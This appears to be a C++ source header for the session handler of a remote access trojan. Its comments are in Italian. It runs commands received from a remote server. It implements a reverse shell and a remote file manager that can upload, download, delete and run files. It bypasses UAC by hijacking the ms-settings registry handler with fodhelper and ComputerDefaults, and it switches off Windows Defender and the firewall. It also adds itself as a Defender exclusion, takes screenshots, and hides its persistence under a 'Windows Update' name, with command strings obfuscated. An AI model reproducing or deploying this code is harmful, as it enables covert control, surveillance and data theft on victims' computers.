#pragma once

class Sessione
{
private:

	SOCKET Sock;
	atomic<bool> VibeMouseController = false;

	DirUtils du;
	MouseUtils mu;
	SystemUtils su;
	RegUtils ru;

	Json DirFileToJson(VectDirFile DirFiles)
	{
		Encode en;
		Json j;

		debug.log.Info("Conversione DirFile in Json...");

		for (int i = 0; i < DirFiles.size(); i++)
		{
			if (DirFiles[i].Name == ".")
				DirFiles.erase(DirFiles.begin() + i);

			DirFiles[i].Name = en.AsciiToUnicode(DirFiles[i].Name);

			j["Files"][i]["Type"] = (DirFiles[i].Type == 1);
			j["Files"][i]["Name"] = (j["Files"][i]["Type"]) ? DirFiles[i].Name : DirFiles[i].Name + "\\";
			j["Files"][i]["Path"] = (du.GetCurrDir().size() == 3) ? en.AsciiToUnicode(du.GetCurrDir()) : en.AsciiToUnicode(du.GetCurrDir()) + "\\";
			j["Files"][i]["FullPath"] = (du.GetCurrDir().size() == 3) ? en.AsciiToUnicode(du.GetCurrDir()) + DirFiles[i].Name : en.AsciiToUnicode(du.GetCurrDir()) + "\\" + DirFiles[i].Name;
			j["Files"][i]["Size"] = (j["Files"][i]["Type"]) ? du.GetSizeOfFile(en.UnicodeToAscii(j["Files"][i]["FullPath"])) : 0;
			j["Files"][i]["LastEdit"] = du.GetTimeOfFile(en.UnicodeToAscii(j["Files"][i]["FullPath"])).LastWriteTime;
		}

		debug.log.Info("Conversione completata.");

		return j;
	}

	void VibeMouseAsync()
	{
		while (VibeMouseController)
		{
			POINT p = mu.GetMousePos();

			p.x += (su.GetRandomNumber(2) == 0) ? su.GetRandomNumber(10) : -su.GetRandomNumber(10);
			p.y += (su.GetRandomNumber(2) == 0) ? su.GetRandomNumber(10) : -su.GetRandomNumber(10);

			mu.SetMousePos(p);

			Sleep(1);
		}
	}

	// COMANDI

	bool GetInfo()
	{
		debug.log.Info("GetInfo");

		WindowUtils wu;
		Settaggi sett;

		sett.GetAllSettings();

		Json j;

		debug.log.Info("Popolo il json...");

		try
		{
			j["IPL"] = TcpIP::GetLocalIP(Sock);
			j["CPU"] = to_string((int)su.GetCPUload()) + "%";
			j["RAM"] = to_string((int)su.GetRAMperc()) + "%";
			j["ACTWIN"] = wu.GetWindowTitle();
			j["INSTDATE"] = sett.InstallDate;
			j["WINDEF"] = Services::GetAvStatus();
		}
		catch (exception ex)
		{ debug.log.Error(ex.what()); }
		
		debug.log.Info("Invio il json...");

		return TcpIP::SendString(Sock, j.dump());
	}

	bool UpdateClient()
	{
		debug.log.Info("Aggiornamento Client in corso...");

		COMUNICAZIONI::NewClient NewClient;

		string FMFP = du.GetFullModuleFilePath();
		string MFP = du.GetModuleFilePath();
		string MF = du.GetModuleFile();
		string UpdateVBS = "";

		NewClient = COMUNICAZIONI::UpdateClient(Sock);

		if (NewClient.j.dump() == "null")
			return false;

		if (!du.CheckDir(MFP + "VXBkYXRl"))
			du.MakeDir(MFP + "VXBkYXRl");

		if (!du.WriteBinaryFile(MFP + "VXBkYXRl\\" + MF, NewClient.Str))
			return false;

		if (NewClient.j["Hidden"])
			su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + MFP + "VXBkYXRl\\" + MF + "\"");
		if (NewClient.j["System"])
			su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + MFP + "VXBkYXRl\\" + MF + "\"");

		UpdateVBS += "WScript.Sleep 1500\n";
		UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
		UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
		UpdateVBS += "filesys.DeleteFile \"" + FMFP + "\"\n";
		UpdateVBS += "filesys.MoveFile \"" + MFP + "VXBkYXRl\\" + MF + "\", \"" + FMFP + "\"\n";
		UpdateVBS += "WScript.Sleep 1000\n";
		UpdateVBS += "WshShell.Run \"\"\"" + FMFP + "\"\"\", 1, false\n";
		UpdateVBS += "filesys.DeleteFolder \"" + MFP + "VXBkYXRl\"\n";
		UpdateVBS += "filesys.DeleteFile \"" + MFP + "Update.vbs\"";

		if (!du.WriteFile(MFP + "Update.vbs", UpdateVBS))
			return false;

		ru.DeleteKey(ru.CurrentUser, "SOFTWARE\\Windows Update");

		su.NoOutputCMD("start \"\" \"" + MFP + "Update.vbs\"");

		return true;
	}

	void Uninstall()
	{
		debug.log.Info("Disinstallazione in corso...");

		string RemoveVBS = "";

		ru.DeleteKey(ru.CurrentUser, "SOFTWARE\\Windows Update");
		ru.DeleteValue(ru.CurrentUser, (string)AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");

		RemoveVBS += "WScript.Sleep 5000\n";
		RemoveVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
		RemoveVBS += "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
		RemoveVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Remove.vbs\"";

		du.WriteFile(du.GetModuleFilePath() + "Remove.vbs", RemoveVBS);
		du.RunFile(du.GetModuleFilePath() + "Remove.vbs");
	}

	void ReveShell()
	{
		debug.log.Info("RevShell");

		string Cmd;
		string Res = "OK";
		string Path = du.GetModuleFilePath(false);
	
		du.SetCurrDir(Path);
	
		while (true)
		{
			Cmd = COMUNICAZIONI::PingPong(Sock, Res);
			
			debug.log.Info("Ricevuto comando: " + Cmd);

			if (Cmd == "")
				return;
			else if (Cmd == "Get cd")
				Res = Path;
			else if (StringUtils::ToLowerCase(Cmd).find("chdir") != string::npos)
			{
				if (StringUtils::ToLowerCase(Cmd) == "chdir .." || StringUtils::ToLowerCase(Cmd) == "chdir..")
				{
					if (Path.size() > 3)
						Path = Path.substr(0, Path.find_last_of("\\"));
					if (Path.size() == 2)
						Path += "\\";

					du.SetCurrDir(Path);
				
					Res = "\n";
				}
				else if (StringUtils::ToLowerCase(Cmd).find("/d") != string::npos && StringUtils::ToLowerCase(Cmd.substr(0, 9)) == "chdir /d ")
				{
					if (Cmd.find("\"") != string::npos)
					{
						if (du.SetCurrDir(Cmd.substr(10, Cmd.find_last_of("\"") - 10)))
							Path = du.GetCurrDir();
					}
					else
						if (du.SetCurrDir(Cmd.substr(9)))
							Path = du.GetCurrDir();
				
					Res = "\n";
				}
				else if (StringUtils::ToLowerCase(Cmd.substr(0, 6)) == "chdir ")
				{
					if (Cmd.find("\"") != string::npos)
					{
						if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
							Path = du.GetCurrDir();
					}
					else
						if (du.SetCurrDir(Cmd.substr(6)))
							Path = du.GetCurrDir();
				
					Res = "\n";
				}
				else
					Res = su.GetCMDOutput(Cmd);
			}
			else if (StringUtils::ToLowerCase(Cmd).find("cd") != string::npos)
			{
				if (StringUtils::ToLowerCase(Cmd) == "cd .." || StringUtils::ToLowerCase(Cmd) == "cd..")
				{
					if (Path.size() > 3)
						Path = Path.substr(0, Path.find_last_of("\\"));
					if (Path.size() == 2)
						Path += "\\";

					du.SetCurrDir(Path);
				
					Res = "\n";
				}
				else if (StringUtils::ToLowerCase(Cmd).find("/d") != string::npos && StringUtils::ToLowerCase(Cmd.substr(0, 6)) == "cd /d ")
				{
					if (Cmd.find("\"") != string::npos)
					{
						if (du.SetCurrDir(Cmd.substr(7, Cmd.find_last_of("\"") - 7)))
							Path = du.GetCurrDir();
					}
					else
						if (du.SetCurrDir(Cmd.substr(6)))
							Path = du.GetCurrDir();
				
					Res = "\n";
				}
				else if (StringUtils::ToLowerCase(Cmd.substr(0, 3)) == "cd ")
				{
					if (Cmd.find("\"") != string::npos)
					{
						if (du.SetCurrDir(Cmd.substr(4, Cmd.find_last_of("\"") - 4)))
							Path = du.GetCurrDir();
					}
					else
						if (du.SetCurrDir(Cmd.substr(3)))
							Path = du.GetCurrDir();
				
					Res = "\n";
				}
				else
					Res = su.GetCMDOutput(Cmd);
			}
			else if (StringUtils::ToLowerCase(Cmd) == "exit")
			{
				TcpIP::SendString(Sock, (string)AY_OBFUSCATE("Reverse shell closed"));
				return;
			}
			else if (StringUtils::ToLowerCase(Cmd).substr(0, 7) == "notepad")
			{
				su.AsyncCMD(Cmd);
				Res = "\n";
			}
			else if (StringUtils::ToLowerCase(Cmd).substr(0, 7) == "taskmgr")
			{
				su.AsyncCMD(Cmd);
				Res = "\n";
			}
			else
				Res = su.GetCMDOutput(Cmd) + "\n";
		}
	}

	void FileExplorer()
	{
		debug.log.Info("Explorer");

		Encode en;
		string Buff = "";
		string Res = "";
		Json j;

		VectDirFile DirFiles;

		du.SetCurrDir(du.GetModuleFilePath());
		du.GetDir(du.GetCurrDir(), DirFiles);
	
		j = DirFileToJson(DirFiles);

		Buff = COMUNICAZIONI::PingPong(Sock, j.dump());

		for (bool b = true; b;)
		{
			if (Buff == "")
				break;

			j.clear();
			j = Json::parse(Buff);

			if (j["Action"] == "Exit")
				break;
			else if (j["Action"] == "OpenDir")
			{
				debug.log.Info("OpenDir " + en.UnicodeToAscii(j["Path"]));

				DirFiles.clear();

				if (du.SetCurrDir(en.UnicodeToAscii(j["Path"])))
				{
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
			else if (j["Action"] == "RunFile")
			{
				debug.log.Info("RunFile " + en.UnicodeToAscii(j["Path"]));

				DirFiles.clear();

				du.RunFile(en.UnicodeToAscii(j["Path"]));
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileToJson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else if (j["Action"] == "GoUp")
			{
				debug.log.Info("GoUp " + du.GetCurrDir() + "\\..");

				DirFiles.clear();

				if (du.SetCurrDir(du.GetCurrDir() + "\\.."))
				{
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
			}
			else if (j["Action"] == "Delete")
			{
				debug.log.Info("Delete " + en.UnicodeToAscii(j["Path"]));

				bool Success = false;

				DirFiles.clear();

				if (j["Type"])
					Success = du.DelFile(en.UnicodeToAscii(j["Path"]));
				else
					Success = du.DelDir(en.UnicodeToAscii(j["Path"]));

				if (Success)
				{
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
				{
					if (debug.Active)
					{
						char errmsg[256];
						strerror_s(errmsg, 256, errno);
						debug.log.Warn(errmsg);
					}
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
				}
			}
			else if (j["Action"] == "Refresh")
			{
				debug.log.Info("Refresh " + du.GetCurrDir());

				DirFiles.clear();
				du.GetDir(du.GetCurrDir(), DirFiles);

				j.clear();
				j = DirFileToJson(DirFiles);

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else if (j["Action"] == "Rename")
			{
				debug.log.Info("Rename " + en.UnicodeToAscii(j["OldName"]) + " -> " + en.UnicodeToAscii(j["NewName"]));

				DirFiles.clear();

				if (du.RenameFileOrDir(en.UnicodeToAscii(j["OldName"]), en.UnicodeToAscii(j["NewName"])))
				{
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
				{
					if (debug.Active)
					{
						char errmsg[256];
						strerror_s(errmsg, 256, errno);
						debug.log.Warn(errmsg);
					}
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
				}
			}
			else if (j["Action"] == "Upload")
			{
				debug.log.Info("Upload from server...");

				DirFiles.clear();

				switch (COMUNICAZIONI::DownloadFileWithLoading(Sock))
				{
					case 0:
						Buff = COMUNICAZIONI::PingPong(Sock, "OK");
						break;

					case 1:
						b = false;
						break;

					case 2:
						if (debug.Active)
						{
							char errmsg[256];
							strerror_s(errmsg, 256, errno);
							debug.log.Warn(errmsg);
						}
						Buff = COMUNICAZIONI::PingPong(Sock, "denied");
						break;
				}
			}
			else if (j["Action"] == "Download")
			{
				string FilePath = en.UnicodeToAscii(j["Path"]);
				string FileName = FilePath.substr(FilePath.find_last_of("\\") + 1);

				debug.log.Info("Download..." + FileName);

				if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, FilePath))
					break;

				if (!TcpIP::RecvString(Sock, Buff))
					break;
			}
			else if (j["Action"] == "Makedir")
			{
				debug.log.Info("MakeDir " + en.UnicodeToAscii(j["Path"]));

				DirFiles.clear();

				if (du.MakeDir(en.UnicodeToAscii(j["Path"])))
				{
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
				{
					if (debug.Active)
					{
						char errmsg[256];
						strerror_s(errmsg, 256, errno);
						debug.log.Warn(errmsg);
					}
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
				}
			}
			else if (j["Action"] == "Makefile")
			{
				debug.log.Info("MakeFile " + en.UnicodeToAscii(j["Path"]));

				DirFiles.clear();

				if (du.WriteFile(en.UnicodeToAscii(j["Path"])))
				{
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
				{
					if (debug.Active)
					{
						char errmsg[256];
						strerror_s(errmsg, 256, errno);
						debug.log.Warn(errmsg);
					}
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
				}
			}
			else if (j["Action"] == "CopyCut")
			{
				bool Success = false;

				DirFiles.clear();

				if (j["CutOrCopy"])
				{
					debug.log.Info("Copy " + en.UnicodeToAscii(j["Path"]) + " -> " + du.GetCurrDir() + "\\" + (string)j["Name"]);

					if (j["Type"])
						Success = du.CopyPasteFile(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
					else
						Success = du.CopyPasteDir(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
				}
				else
				{
					debug.log.Info("Cut " + en.UnicodeToAscii(j["Path"]) + " -> " + du.GetCurrDir() + "\\" + (string)j["Name"]);

					if (j["Type"])
						Success = du.CutFile(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
					else
						Success = du.CutDir(en.UnicodeToAscii(j["Path"]), du.GetCurrDir() + "\\" + (string)j["Name"]);
				}

				if (Success)
				{
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
				{
					if (debug.Active)
					{
						char errmsg[256];
						strerror_s(errmsg, 256, errno);
						debug.log.Warn(errmsg);
					}
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
				}
			}
			else if (j["Action"] == "ChangePartition")
			{
				debug.log.Info("ChangePartition");

				DirFiles.clear();
				du.GetDir(du.GetCurrDir(), DirFiles);

				VectString Drives = du.GetDriveLetters();

				j.clear();

				for (int i = 0; i < Drives.size(); i++)
				{
					j["Files"][i]["Type"] = false;
					j["Files"][i]["Name"] = Drives[i];
					j["Files"][i]["Path"] = Drives[i];
					j["Files"][i]["FullPath"] = Drives[i];
					j["Files"][i]["Size"] = 0;
					j["Files"][i]["LastEdit"] = 0;
				}

				Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
			}
			else if (j["Action"] == "Zip")
			{
				debug.log.Info("Zip " + en.UnicodeToAscii(j["Path"]));

				if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Compress-Archive '") + en.UnicodeToAscii(j["Path"]) + "' '" + en.UnicodeToAscii(j["Name"]) + ".zip' -force") == 0)
				{
					DirFiles.clear();
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
				{
					if (debug.Active)
					{
						char errmsg[256];
						strerror_s(errmsg, 256, errno);
						debug.log.Warn(errmsg);
					}
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
				}
			}
			else if (j["Action"] == "Unzip")
			{
				debug.log.Info("Unzip " + en.UnicodeToAscii(j["Path"]));

				if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Expand-Archive '") + en.UnicodeToAscii(j["Path"]) + "' -force") == 0)
				{
					DirFiles.clear();
					du.GetDir(du.GetCurrDir(), DirFiles);

					j.clear();
					j = DirFileToJson(DirFiles);

					Buff = COMUNICAZIONI::PingPong(Sock, j.dump());
				}
				else
				{
					if (debug.Active)
					{
						char errmsg[256];
						strerror_s(errmsg, 256, errno);
						debug.log.Warn(errmsg);
					}
					Buff = COMUNICAZIONI::PingPong(Sock, "denied");
				}
			}
			else
				break;
		}
	}

	bool BypUAC()
	{
		string Buff;

		if (!TcpIP::RecvString(Sock, Buff))
			return false;

		int mode = stoi(Buff);

		debug.log.Info("ByUAC " + Buff + "...");

		bool Success = true;

		string EmergencyVBS = "WScript.Sleep 15000\n";
		EmergencyVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
		EmergencyVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
		EmergencyVBS += "WshShell.Run \"\"\"" + du.GetFullModuleFilePath() + "\"\"\", 1, false\n";
		EmergencyVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Emer.vbs\"";
	
		du.WriteFile(du.GetModuleFilePath() + "Emer.vbs", EmergencyVBS);
		du.WriteFile(du.GetModuleFilePath() + "aele1");

		debug.log.Info("Scritti file aele1 e Emer.vbs");

		du.RunFile(du.GetModuleFilePath() + "Emer.vbs");

		debug.log.Info("Avviato file Emer.vbs");

		if (mode == 1)
		{
			if (!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command")))
				Success = false;
			if (!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"), "", ((string)AY_OBFUSCATE("cmd /c start \"\" \"") + du.GetFullModuleFilePath() + "\"")))
				Success = false;
			if (!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer")))
				Success = false;
			if (!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"), "", (string)AY_OBFUSCATE(".pwn")))
				Success = false;

			debug.log.Info("Registro " + (string)(Success ? "TRUE" : "FALSE"));

			if (Success)
			{
				du.WriteFile(du.GetModuleFilePath() + "aele2");
				debug.log.Info("Scritto file aele2");
				su.NoOutputCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden"));
			}
		}
		else if (mode == 2)
		{
			if (!ru.CreateKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command")))
				Success = false;
			if (!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command"), "", du.GetFullModuleFilePath()))
				Success = false;
			if (!ru.WriteDwordValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command"), "DelegateExecute", 0))
				Success = false;

			debug.log.Info("Registro " + (string)(Success ? "TRUE" : "FALSE"));

			if (Success)
			{
				du.WriteFile(du.GetModuleFilePath() + "aele2");
				debug.log.Info("Scritto file aele2");
				su.AsyncCMD((string)AY_OBFUSCATE("powershell Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\" -WindowStyle Hidden"));
			}
		}
		
		du.WriteFile(du.GetModuleFilePath() + "aele3");
		debug.log.Info("Scritto file aele3");

		Sleep(6000);
		
		if (mode == 1)
		{
			ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\CurVer"));
			ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\.pwn\\Shell\\Open\\command"));
		}
		else if (mode == 2)
		{
			ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell\\Open\\command"), "", du.GetFullModuleFilePath());
			ru.DeleteKey(ru.CurrentUser, (string)AY_OBFUSCATE("Software\\Classes\\ms-settings\\Shell"));
		}
		
		debug.log.Info("Registro pulito");

		for (int i = 0; i < 4; i++)
		{
			if (du.CheckFile(du.GetModuleFilePath() + "aeleOK"))
			{
				debug.log.Info("Elevazione riuscita");

				TcpIP::SendString(Sock, "OK");
				Sleep(500);
				return true;
			}
			Sleep(1000);
		}
		
		du.WriteFile(du.GetModuleFilePath() + "aele4");
		debug.log.Info("Elevazione fallita, scritto file aele4");

		TcpIP::SendString(Sock, "NO");
		return false;
	}

	bool VibeMouse()
	{
		if (VibeMouseController)
		{
			debug.log.Info("Fermo vibrazione mouse");

			VibeMouseController = false;
			return TcpIP::SendString(Sock, "b");
		}
		else
		{
			debug.log.Info("Avvio vibrazione mouse");

			VibeMouseController = true;
			thread tVMA(&Sessione::VibeMouseAsync, this);
			tVMA.detach();

			return TcpIP::SendString(Sock, "a");
		}

		return false;
	}

	bool AddAVexclusion()
	{
		debug.log.Info("Aggiungo esclusione AV");

		if (!Services::GetAvStatus())
			return TcpIP::SendString(Sock, "no");

		if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell -inputformat none -outputformat none -NonInteractive -Command \"Add-MpPreference -ExclusionProcess '") + du.GetFullModuleFilePath() + "'\"") == 0)
			return TcpIP::SendString(Sock, "ok");

		return TcpIP::SendString(Sock, "ko");
	}

	bool DisableFW()
	{
		debug.log.Info("Disattivo il FW");

		if (su.NoOutputCMD((string)AY_OBFUSCATE("netsh advfirewall set allprofiles state off")) == 0)
			return TcpIP::SendString(Sock, "ok");

		return TcpIP::SendString(Sock, "ko");
	}

	bool Screenshot()
	{
		debug.log.Info("Screenshot");

		Mat Desktop;
		vector<uchar> vect;
		string Buff;
		Monitors mon;
		Json json;

		mon.GetMonitorList();
		
		for (int i = 0; i < mon.MonitorList.size(); i++)
		{
			json[i]["Nome"] = mon.MonitorList[i].name;
			json[i]["Width"] = to_string(mon.MonitorList[i].width);
			json[i]["Height"] = to_string(mon.MonitorList[i].height);
		}

		Buff = COMUNICAZIONI::PingPong(Sock, json.dump());
		if (Buff.empty())
			return false;

		try { stoi(Buff); }
		catch (exception ex) { return false; }

		Desktop = ScreenshotUtils::CaptureMatScreenshot(mon.MonitorList[stoi(Buff)].hMonitor);
		imencode(".jpeg", Desktop, vect, { IMWRITE_JPEG_QUALITY, 100 });

		Buff.clear();
		Buff = string(vect.begin(), vect.end());
		Buff = Services::compress_string(Buff);

		bool Result = TcpIP::SendString(Sock, Buff);

		vect.clear();
		Buff.clear();

		return Result;
	}

	void Reinstall()
	{
		debug.log.Info("Reinstallazione in corso...");

		ru.DeleteKey(ru.CurrentUser, "SOFTWARE\\Windows Update");
		ru.DeleteValue(ru.CurrentUser, (string)AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");

		su.RunExe(du.GetFullModuleFilePath());
	}

	bool DisableAV()
	{
		debug.log.Info("Disattivo l'AV");

		if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell Set-MpPreference -DisableRealtimeMonitoring $true")) == 0)
			if (ru.WriteDwordValue(ru.LocalMachine, (string)AY_OBFUSCATE("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), (string)AY_OBFUSCATE("DisableAntiSpyware"), 1))
			{
				ru.WriteDwordValue(ru.LocalMachine, (string)AY_OBFUSCATE("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), (string)AY_OBFUSCATE("DisableWinDefender"), 1);
				return TcpIP::SendString(Sock, "ok");
			}

		return TcpIP::SendString(Sock, "ko");
	}

public:

	Sessione(SOCKET _Sock)
	{
		Sock = _Sock;
	}

	short Start()
	{
		SystemUtils su;
		string cmd = "";
		int errorType = 0;

		for (bool i = true; i;)
		{
			cmd = "";
			if (!TcpIP::RecvString(Sock, cmd, errorType) && errorType != 10060)
				i = false;

			debug.log.Info("Comando sessione: \"" + cmd + "\" [" + to_string(errorType) + "]");

			if (cmd == "" && errorType != 10060)
			{
				i = false;
			}
			else if (cmd == "getinfo")
			{
				i = GetInfo();
			}
			else if (cmd == "invertmouse")
			{
				i = COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
			}
			else if (cmd == "reconnect")
			{
				i = false;
			}
			else if (cmd == "kill")
			{
				return 1;
			}
			else if (cmd == "shutdown")
			{
				su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -s -f -t 0"));
			}
			else if (cmd == "reboot")
			{
				su.NoOutputCMD((string)AY_OBFUSCATE("shutdown -r -f -t 0"));
			}
			else if (cmd == "updateclient")
			{
				if (UpdateClient()) return 1;
			}
			else if (cmd == "uninstall")
			{
				Uninstall();
				return 1;
			}
			else if (cmd == "restart")
			{
				su.RunExe(du.GetFullModuleFilePath());
				return 1;
			}
			else if (cmd == (string)AY_OBFUSCATE("reverseshell"))
			{
				ReveShell();
			}
			else if (cmd == "fileexplorer")
			{
				FileExplorer();
			}
			else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
			{
				if (BypUAC()) return 1;
			}
			else if (cmd == "vibemouse")
			{
				i = VibeMouse();
			}
			else if (cmd == "addexclusion")
			{
				i = AddAVexclusion();
			}
			else if (cmd == "disablefw")
			{
				i = DisableFW();
			}
			else if (cmd == "screenshot")
			{
				i = Screenshot();
			}
			else if (cmd == "reinstall")
			{
				Reinstall();
				return 1;
			}
			else if (cmd == "disableav")
			{
				i = DisableAV();
			}
			else if (cmd == "keepalive")
			{
				i = TcpIP::SendString(Sock, "imalive");
			}
		}

		return 0;
	}

};